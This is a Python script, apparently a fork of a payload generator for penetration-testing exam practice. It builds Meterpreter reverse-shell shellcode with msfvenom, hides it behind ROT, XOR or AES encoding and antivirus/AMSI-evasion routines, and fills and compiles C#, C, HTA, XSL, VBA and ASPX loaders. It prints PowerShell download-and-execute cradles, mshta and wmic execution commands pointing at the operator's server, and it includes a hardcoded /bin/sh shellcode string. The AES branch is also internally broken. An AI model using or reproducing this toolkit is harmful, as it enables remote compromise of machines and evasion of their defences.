#/usr/bin/python3

import os
import glob
import shlex
import random
import string
import base64
import socket
import textwrap
import argparse
import binascii
import itertools
import subprocess

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

BLOCK_SIZE = 16

def files(path):
    for file in os.listdir(path):
        if os.path.isfile(os.path.join(path, file)):
            yield file

def cheers():
    print("[+] We're all done here")
    print("[+] Now go and get the OSEP :)")
    print("[+] Run MSF resource file: msfconsole -q -r 64handler.rc")
    print("[+] Running HTTP Server: python3 -m http.server 8080 -d ./output")
    subprocess.run(["python3", "-m", "http.server", "8080", "-d", "./output"])

def exe_will_rain():
    print("[+] Starting to compile C/CS files...")
    #out_null = " &>/dev/null"
    try:
        for filename in glob.glob("output/32*.cs"):
            command = "mcs -platform:x86 -unsafe -r:System.Configuration.Install %s -nowarn:W1[,Wn]"%(filename)
            #print("[+] Compiling: ",command)
            #os.system(command)
            subprocess.check_call(shlex.split(command),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            #subprocess.run(command,shell=True)
            print()

        for filename in glob.glob("output/64*.cs"):
            command = "mcs -platform:x64 -unsafe -r:System.Configuration.Install %s -nowarn:W1[,Wn]"%(filename)
            #print("[+] Compiling: ",command)
            #os.system(command)
            subprocess.check_call(shlex.split(command),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            #subprocess.run(command,shell=True)
            print()

        for filename in glob.glob("output/64*.c"):
            command = "gcc -o %s %s -z execstack"%(filename[:-2], filename)
            #print("[+] Compiling: ",command)
            #os.system(command)
            subprocess.check_call(shlex.split(command),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            #subprocess.run(command,shell=True)
            print()

    except Exception as e:
        print(str(e))
        quit()
    print("[+] Done compiling cs/c files")

def rc_filling(ip_mark:str, port_mark:str, payload_mark:str, l:str, p:int, m:str):
    print("[+] Starting to fill up msf resource files..")

    try:
        for filename in os.listdir("resource_file_templates"):
            with open(os.path.join("resource_file_templates", filename), 'r') as f:
                text = f.read()
                first_text = text.replace(ip_mark, l, 1)
                result_text = first_text.replace(port_mark, str(p), 1)
                result_text = result_text.replace(payload_mark, m)
                with open(os.path.join("output", filename), 'w') as r:
                    r.write(result_text)

    except Exception as e:
        print(str(e))
        quit()

    print("[+] Done filling msf rc files")
       
def template_filling(shell_mark, dec_mark, ps_mark, av_ev_mark, av_ev_routine, dec_routine, buf: str, arch:int, ip_mark, ip, cyp_mark, cyp, buf_linux, dec_routine_linux, buf_vba, dec_routine_vba, original_buf: str):
    #print("[+] The mark where shellcode will be inserted is: '%s'"%(shell_mark))
    print("[+] Starting to fill up payload templates..")

    if arch == 32:
        print("[+] Arch: x86")
        key = "32"
        out_arch = "x86"
    elif arch == 64:
        print("[+] Arch: x64")
        key = "64"
        out_arch = "x64"

    byte_len = buf.count("0x")
    crafted_payload = "byte[] buf = new byte[%d] {%s};"%(byte_len, buf)

    byte_len_original = original_buf.count("0x")
    crafted_payload_original = "byte[] buf = new byte[%d] {%s};"%(byte_len_original, original_buf)
    
    crafted_payload_linux = "unsigned char buf[] = \"%s\";"%(buf_linux)
    
    crafted_payload_vba = "buf = Array(%s)"%(buf_vba)
    
    savedxslrunner = False

    #print(crafted_payload)

    try:
        for filename in files('templates'):
            with open(os.path.join("templates", filename), 'r') as f:
                if (filename.endswith(".cs") or filename.endswith(".ps1") or filename.endswith(".hta") or filename.endswith(".xsl") or filename.endswith(".vbaxsl") or filename.endswith(".aspx")):
                    text = f.read()
                    if filename.endswith(".cs"):
                        #print("[+] CS Template")
                        shell_text = text.replace(shell_mark, crafted_payload, 1)
                        result_text = shell_text.replace(dec_mark, dec_routine, 1)
                        result_text = result_text.replace(av_ev_mark, av_ev_routine, 1)
                        with open(os.path.join("output", key+filename), 'w') as r:
                            r.write(result_text)
                        print("    Saved .cs file: {}".format(key+filename))
                    if filename.endswith(".ps1"):
                        #print("[+] PS1 Template")
                        result_text = text.replace(ip_mark, ip, 1)
                        #result_text = result_text.replace(cyp_mark, cyp, 1)
                        with open(os.path.join("output", filename), 'w') as r:
                            r.write(result_text)
                        print("    Saved .ps1 file: {}".format(filename))
                        ps_cmd = "IEX(New-Object Net.WebClient).DownloadString('http://{}:8080/{}')".format(ip, filename)
                        b64 = base64.b64encode(ps_cmd.encode('utf-16-le'))
                        print("    PS Download Cradle:")
                        print("    powershell.exe {}".format(ps_cmd))
                        print("    PS Download Cradle Enc:")
                        print("    powershell.exe -exec bypass -enc {}".format(b64.decode()))
                    if filename.endswith(".hta"):
                        #print("[+] HTA Template")
                        ps_cmd = "powershell IEX(New-Object Net.WebClient).DownloadString('http://{}:8080/reflection_assembly_runner.ps1')".format(ip)
                        result_text = text.replace(ps_mark, ps_cmd, 1)
                        with open(os.path.join("output", filename), 'w') as r:
                            r.write(result_text)
                        print("    Saved .hta file: {}".format(filename))
                        print("    MSHTA Exec: C:\Windows\System32\mshta.exe http://{}:8080/{}".format(ip, filename))
                    if filename.endswith(".xsl"):
                        #print("[+] XSL Template")
                        ps_cmd = "powershell IEX(New-Object Net.WebClient).DownloadString('http://{}:8080/reflection_assembly_runner.ps1')".format(ip)
                        result_text = text.replace(ps_mark, ps_cmd, 1)
                        with open(os.path.join("output", filename), 'w') as r:
                            r.write(result_text)
                        print("    Saved .xsl file: {}".format(filename))
                        print("    XSL Exec: wmic process get brief /format:\"http://{}:8080/{}\" ".format(ip, filename))
                        savedxslrunner = True
                    if filename.endswith(".vbaxsl") and savedxslrunner:
                        #print("[+] VBAXSL Template")
                        ps_cmd = "http://{}:8080/{}".format(ip, "xsl_ps_runner.xsl")
                        result_text = text.replace(ps_mark, ps_cmd, 1)
                        with open(os.path.join("output", filename.replace(".vbaxsl", ".vba")), 'w') as r:
                            r.write(result_text)
                        print("    Saved .vba file: {}".format(filename.replace(".vbaxsl", ".vba")))
                    if filename.endswith(".aspx"):
                        if arch == 64:
                            #print("[+] ASPX Template")
                            shell_text = text.replace(shell_mark, crafted_payload_original, 1)
                            result_text = shell_text.replace(dec_mark, dec_routine, 1)
                            result_text = result_text.replace(av_ev_mark, av_ev_routine, 1)
                            with open(os.path.join("output", key+filename), 'w') as r:
                                r.write(result_text)
                            print("    Saved .aspx file: {}".format(key+filename))
    except Exception as e:
        print(str(e))
        quit()
    if (buf_linux != "" and dec_routine_linux != ""):
        try:
            for filename in files('templates'):
                with open(os.path.join("templates", filename), 'r') as f:
                    if filename.endswith(".c"):
                        #print("[+] C Template")
                        text = f.read()
                        shell_text = text.replace(shell_mark, crafted_payload_linux, 1)
                        result_text = shell_text.replace(dec_mark, dec_routine_linux, 1)
                        with open(os.path.join("output", key+filename), 'w') as r:
                            r.write(result_text)
                        print("    Saved .c file: {}".format(key+filename))
        except Exception as e:
            print(str(e))
            quit()
    if (buf_vba != "" and dec_routine_vba != ""):
        if cyp == "rot" and key == "64":
            try:
                for filename in files('templates'):
                    with open(os.path.join("templates", filename), 'r') as f:
                        if filename.endswith(".vba"):
                            #print("[+] VBA Template")
                            text = f.read()
                            shell_text = text.replace(shell_mark, crafted_payload_vba, 1)
                            result_text = shell_text.replace(dec_mark, dec_routine_vba, 1)
                            with open(os.path.join("output", key+filename), 'w') as r:
                                r.write(result_text)
                            print("[+] Saved .vba file: {}".format(key+filename))
            except Exception as e:
                print(str(e))
                quit()

    print("[+] {} Payload template filling done!".format(out_arch))


def rot_encoding(content_32, content_64):
    # Thanks to https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86

    key:int = random.randrange(1,25)
    print("[+] Encoding shellcode with ROT - Key: %d"%(key))

    enc_content_32 = ""
    enc_content_64 = ""
    enc_content_64_vba = ""
    original_64 = ""
    dec_routine = """
    for (int i = 0; i < buf.Length; i++)
    {
        buf[i] = (byte)(((uint)buf[i] - %d) & 0xFF);
    }
    """%(key)

    dec_routine_vba = """
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - %d
    Next i
    """%(key)

    try:
        for i in bytearray.fromhex(content_32):
            j = (i + key)%256
            enc_content_32 += '0x'
            enc_content_32 += '%02x,' %j

        enc_content_32 = enc_content_32[:-1]
        
        for i in bytearray.fromhex(content_64):
            j = (i + key)%256
            enc_content_64 += '0x'
            enc_content_64 += '%02x,' %j

        enc_content_64 = enc_content_64[:-1]

        for i in bytearray.fromhex(content_64):
            j = i
            original_64 += '0x'
            original_64 += '%02x, ' %j

        original_64 = original_64[:-2]

        counter = 0
        for i in bytearray.fromhex(content_64):
            j = (i + key)%256
            if counter == 79:
                enc_content_64_vba += '_\n'
                counter = 0
            enc_content_64_vba += '%02d, ' %j
            counter += 1
        
        enc_content_64_vba = enc_content_64_vba[:-2]

    except Exception as e:
        print(str(e))
        quit()

    #print(enc_content_32)
    return enc_content_32, enc_content_64, dec_routine, enc_content_64_vba, dec_routine_vba, original_64


def xor_crypt_string(data: bytes(), key:string):
    l = len(key)
    keyAsInt = list(map(ord, key))
    xored = bytes(bytearray((
        (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
    )))
    return xored.hex()


def xor_encoding(content_32, content_64, content_64_linux):

    letters = string.ascii_lowercase
    key:str = "".join(random.choice(letters) for i in range(16))
    xor_32 = xor_crypt_string(bytes.fromhex(content_32), key)
    xor_64 = xor_crypt_string(bytes.fromhex(content_64), key)
    xor_64_linux = xor_crypt_string(bytes.fromhex(content_64_linux), key[0])

    print("[+] Encoding shellcode with XOR - Key: %s"%(key))
    
    enc_content_32 = ""
    enc_content_64 = ""
    enc_content_64_linux = ""
    original_64 = ""
    
    dec_routine = """
    string key = "%s";
    for (int i = 0; i < buf.Length; i++)
    {
        buf[i] = (byte)((uint)buf[i] ^ key[i %% key.Length]);
    }
    """%(key)

    dec_routine_linux = """
    char xor_key = '%s';
    int arraysize = (int) sizeof(buf);
    for (int i=0; i<arraysize-1; i++)
    {
        buf[i] = buf[i]^xor_key;
    }
    """%(key[0])

    try:
        for i in bytearray.fromhex(xor_32):
            j = i 
            enc_content_32 += '0x'
            enc_content_32 += '%02x,' %j

        enc_content_32 = enc_content_32[:-1]
        
        for i in bytearray.fromhex(xor_64):
            j = i
            enc_content_64 += '0x'
            enc_content_64 += '%02x,' %j

        enc_content_64 = enc_content_64[:-1]

        for i in bytearray.fromhex(content_64):
            j = i
            original_64 += '0x'
            original_64 += '%02x,' %j

        original_64 = original_64[:-1]

        for i in bytearray.fromhex(xor_64_linux):
            j = i
            enc_content_64_linux += '\\x'
            enc_content_64_linux += '%02x' %j

    except Exception as e:
        print(str(e))
        quit()
    
    return enc_content_32, enc_content_64, dec_routine, enc_content_64_linux, dec_routine_linux, original_64


def aes_crypt_string(data: bytes(), key:string):
    cipher = AES.new(key.encode('utf-8'), AES.MODE_ECB)
    encrypted_data = cipher.encrypt(pad(data, BLOCK_SIZE))
    return encrypted_data.hex()


def aes_encoding(content_32, content_64, content_64_linux):

    letters = string.ascii_lowercase
    key:str = "".join(random.choice(letters) for i in range(16))
    aes_32 = aes_crypt_string(bytes.fromhex(content_32), key)
    aes_64 = aes_crypt_string(bytes.fromhex(content_64), key)
    #aes_64_linux = aes_crypt_string(bytes.fromhex(content_64_linux), key[0])

    print("[+] Encoding shellcode with aes - Key: %s"%(key))
    
    enc_content_32 = ""
    enc_content_64 = ""
    enc_content_64_linux = ""
    
    dec_routine = """
    private static byte[] aesDecrypt(byte[] cipher, byte[] key)
        {
            var IV = cipher.SubArray(0, 16);
            //var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);

            // Create an AesManaged object with the specified key and IV.
            using (AesManaged aes = new AesManaged())
            {
                aes.Padding = PaddingMode.Zeros;
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = IV;
                aes.Mode = CipherMode.ECB;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipher, 0, cipher.Length);
                    }

                    return ms.ToArray();
                }
            }
        }
    string key = "%s";
    byte[] pie = aesDecrypt(buf, UTF8Encoding.UTF8.GetBytes(key));
    byte[] buf = byte[] pie;
    """%(key)

    enc_content_64_linux = ""
    dec_routine_linux = ""

    try:
        for i in bytearray.fromhex(aes_32):
            j = i 
            enc_content_32 += '0x'
            enc_content_32 += '%02x,' %j

        enc_content_32 = enc_content_32[:-1]
        
        for i in bytearray.fromhex(aes_64):
            j = i
            enc_content_64 += '0x'
            enc_content_64 += '%02x,' %j

        enc_content_64 = enc_content_64[:-1]

        # for i in bytearray.fromhex(aes_64_linux):
        #     j = i
        #     enc_content_64_linux += '\\x'
        #     enc_content_64_linux += '%02x' %j

    except Exception as e:
        print(str(e))
        quit()
    
    return enc_content_32, enc_content_64, dec_routine, enc_content_64_linux, dec_routine_linux


def msf_gen(l:str, p:int, d:str, m:str):
    print("[+] Starting...")
    
    try:
        if (d == None):
            print("[+] Payloads for %s:%d"%(l,p))
            if not (os.path.isfile("shellcode32.hex") and os.path.isfile("shellcode32.hex")):
                print("[+] Generating Windows Meterpreter payloads with msfvenom...")
                
                msf_1 = "msfvenom -p windows/x64/meterpreter/reverse_%s LHOST=%s EXITFUNC=thread LPORT=%d -f hex -o shellcode64.hex"%(m,l,p)
                print("[+] Executing: ", msf_1)
                #os.system(msf_1)
                subprocess.check_call(shlex.split(msf_1),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                msf_2 = "msfvenom -p windows/meterpreter/reverse_%s LHOST=%s EXITFUNC=thread LPORT=%d -f hex -o shellcode32.hex"%(m,l,p)
                print("[+] Executing: ", msf_2)
                #os.system(msf_2)
                subprocess.check_call(shlex.split(msf_2),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                print("[+] Windows .hex shellcode files already exist...")

            if not (os.path.isfile("shellcode64_linux.hex")):
                print("[+] Generating Linux Reverse TCP payload with msfvenom...")
                
                msf_3 = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f hex -o shellcode64_linux.hex"%(l,p)
                print("[+] Executing: ", msf_3)
                #os.system(msf_3)
                subprocess.check_call(shlex.split(msf_3),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                print("[+] Linux .hex shellcode file already exist...")
        else:
            print("[+] Donut Payloads ...")
            if not (os.path.isfile("shellcode32.hex") and os.path.isfile("shellcode32.hex")):
                print("[+] Generating payloads with donut...")

                msf_1 = "./donut/donut -i {}/{} -f 8 -o shellcode64.hex".format(os.getcwd(), d)
                print("[+] Executing: ", msf_1)
                #os.system(msf_1)
                subprocess.check_call(shlex.split(msf_1),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                cmd_sed = r"sed -i 's|\\x||g' shellcode64.hex"
                #os.system(r"sed -i 's|\\x||g' shellcode64.hex")
                subprocess.check_call(shlex.split(cmd_sed),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                msf_2 = "./donut/donut -i {}/{} -f 8 -o shellcode32.hex".format(os.getcwd(), d)
                print("[+] Executing: ", msf_2)
                os.system(msf_2)
                subprocess.check_call(shlex.split(msf_2),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                cmd_sed = r"sed -i 's|\\x||g' shellcode32.hex"
                #os.system(r"sed -i 's|\\x||g' shellcode32.hex")
                subprocess.check_call(shlex.split(cmd_sed),stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                print("[+] Windows .hex shellcode files already exist...")
            
            if not (os.path.isfile("shellcode64_linux.hex")):
                print("[+] Generating Linux /bin/sh payload...")
                
                print("[+] Writing to file: shellcode64_linux.hex")
                msf_3 = "504831d24831f648bb2f62696e2f2f736853545fb03b0f05"
                shellcode64_linux = open('shellcode64_linux.hex', 'w')
                shellcode64_linux.write(msf_3)
                shellcode64_linux.close()
                #os.system(msf_3)
                #subprocess.check_call(shlex.split(msf_3),stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                print("[+] Linux .hex shellcode file already exist...")
        
        print("[+] Loading payloads...")
        
        with open("shellcode32.hex", "r") as file:
            content_32 = file.read()

        with open("shellcode64.hex", "r") as file:
            content_64 = file.read()
        
        with open("shellcode64_linux.hex", "r") as file:
            content_64_linux = file.read()
        
    except Exception as e:
        print(str(e))
        quit()

    return content_32, content_64, content_64_linux


def cli_parser():
    parser = argparse.ArgumentParser(description=textwrap.dedent('''\

 ___, - __    ___,   ___, - __  _,
(-|_)  (-|   (-|_\_,(- /   (-\ |  
 _|__)  _|__, _|  )  ,/__,    \|  
(      (     (              (__/  

-> Fork by @blazz3
-> Payload generator for lazy pentesters. Msfvenom and mcs need to be installed and in path.
    '''), usage='python3 %(prog)s -l <LHOST> -p <LPORT> -e <ENCODING> -d <ROUTINE>', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-l', help='-l LHOST', type=str)
    parser.add_argument('-p', help='-p LPORT', type=int)
    parser.add_argument('-e', help='-e ENCODING', type=str)
    parser.add_argument('-d', help='-d FILE -> Use donut for shellcode generation. Target file needs to be located uner ./donut/', type=str)
    parser.add_argument('-a', help=textwrap.dedent('''\
    NoOpt - No AV Evasion routine
        1 - Sleep + VirtualAllocExNuma
        2 - Sleep + VirtualAllocExNuma + Rastamouse's AMSI Bypass
        '''), type=str)
    parser.add_argument('-m', help='-m PAYLOAD -> tcp(default) or https', type=str)
    args = parser.parse_args()
    
    if (args.l == None or args.p == None or args.e == None):
        parser.print_help()
        quit()

    return args.l, args.p, args.e, args.d, args.a, args.m

def check_ip(l):
    try:
        socket.inet_aton(l)
    except:
        print("[-] '%s' is not a valid IP address"%(l))
        quit()

def check_port(p):
    try:
        int(p)
    except Exception as e:
        print(str(e))
        quit()

    if 1 <= p <= 65535:
        pass
    else:
        print("[-] '%s' is not a valid port"%(p))
        quit()

def check_enc(e):
    try:
        if (e == "xor" or e == "rot"):
            pass
        else:
            print("[-] Encoding not available")
            quit()
        
    except Exception as e:
        print(str(e))
        quit()

def check_bin(d):
    try:
        if (d == None):
            pass
        elif (os.path.exists(d)):
            pass
        else:
            print("[-] The file '%s' does not exist"%(d))
            quit()
        
    except Exception as e:
        print(str(e))
        quit()


def check_avev(a):
    try:
        if (a == None):
            pass
        elif (int(a) == 1 or int(a) == 2):
            pass
        else:
            print("[-] Routine not available")
            quit()
        
    except Exception as e:
        print(str(e))
        quit()
        
def check_payl(m):
    try:
        if (m == "tcp" or m == "https" or m == None):
            pass
        else:
            print("[-] Payload not available")
            quit()
        
    except Exception as e:
        print(str(e))
        quit()


if __name__=="__main__":
    #Get IP and port from command line arguments
    l:str
    p:int
    e:str
    d:str
    a:bool
    m:str
    l, p, e, d, a, m = cli_parser()
    check_port(p)
    check_ip(l)
    check_enc(e)
    check_bin(d)
    check_avev(a)
    check_payl(m)
    
    if (m == None):
        m = "tcp"
    
    #Generating corresponding meterpreter payloads
    content_32:str
    content_64:str
    content_64_linux:str
    content_64_vba:str
    content_32, content_64, content_64_linux = msf_gen(l, p, d, m)

    shell_mark:str = "!!!_SHELLCODE_MARK!!!"
    dec_mark:str = "!!!DECODE_ROUTINE!!!"
    ip_mark:str = "!!!IP_MARK!!!"
    port_mark:str = "!!!PORT_MARK!!!"
    cyp_mark:str = "!!!CYP_MARK!!!"
    ps_mark:str = "!!!PS_MARK!!!"
    av_ev_mark:str = "!!!_AVEVASION_MARK!!!"
    payload_mark:str = "!!!PAYLOAD_MARK!!!"
    dec_routine:str = ""
    dec_routine_linux:str = ""
    dec_routine_vba:str = ""
    original_64:str = ""

    if (a == "1"):
        av_ev_routine:str = """
        bool rslt = buy_in();
        if (!rslt)
        {
            Console.WriteLine("Architecture is not compatible");
            System.Environment.Exit(1);
        }
        """
    elif(a == "2"):
        av_ev_routine:str = """
        bool rslt = buy_in();
        if (!rslt)
        {
            Console.WriteLine("Architecture is not compatible");
            System.Environment.Exit(1);
        }
        cleaning();
        """
    else:
        av_ev_routine:str = ""

    if str(e).upper() == "ROT":
        cyp:str = "rot"
        # Encoding with ROT
        content_32, content_64, dec_routine, content_64_vba, dec_routine_vba, original_64 = rot_encoding(content_32,content_64)
        #Open all files in "templates" folder, and swap the content with the payloads
        #template_filling(shell_mark, dec_mark, ps_mark, dec_routine, content_32, 32, ip_mark, l, cyp_mark, cyp, "", "", "", "")
        template_filling(shell_mark, dec_mark, ps_mark, av_ev_mark, av_ev_routine, dec_routine, content_64, 64, ip_mark, l, cyp_mark, cyp, "", "", content_64_vba, dec_routine_vba, original_64)
    elif str(e).upper() == "XOR":
        cyp:str = "xor"
        # Encoding with XOR
        content_32, content_64, dec_routine, content_64_linux, dec_routine_linux, original_64 = xor_encoding(content_32, content_64, content_64_linux)
        #Open all files in "templates" folder, and swap the content with the payloads
        #template_filling(shell_mark, dec_mark, ps_mark, dec_routine, content_32, 32, ip_mark, l, cyp_mark, cyp, "", "", "", "")
        template_filling(shell_mark, dec_mark, ps_mark, av_ev_mark, av_ev_routine, dec_routine, content_64, 64, ip_mark, l, cyp_mark, cyp, content_64_linux, dec_routine_linux, "", "", original_64)
        #quit()
    elif str(e).upper() == "AES":
        cyp:str = "aes"
        # Encoding with XOR
        content_32, content_64, dec_routine, content_64_linux, dec_routine_linux, original_64  = aes_encoding(content_32, content_64, content_64_linux)
        #Open all files in "templates" folder, and swap the content with the payloads
        #template_filling(shell_mark, dec_mark, ps_mark, dec_routine, content_32, 32, ip_mark, l, cyp_mark, cyp, "", "", "", "")
        template_filling(shell_mark, dec_mark, ps_mark, av_ev_mark, av_ev_routine, dec_routine, content_64, 64, ip_mark, l, cyp_mark, cyp, "", "", "", "", original_64)
        #quit()
    else:
        print("[-] Did you set a supported encoding method?")
        quit()

    #Compiling all CS files for you bro
    exe_will_rain()

    rc_filling(ip_mark, port_mark, payload_mark, l, p, m)

    #Only cheers up the amazing pentesters
    cheers()
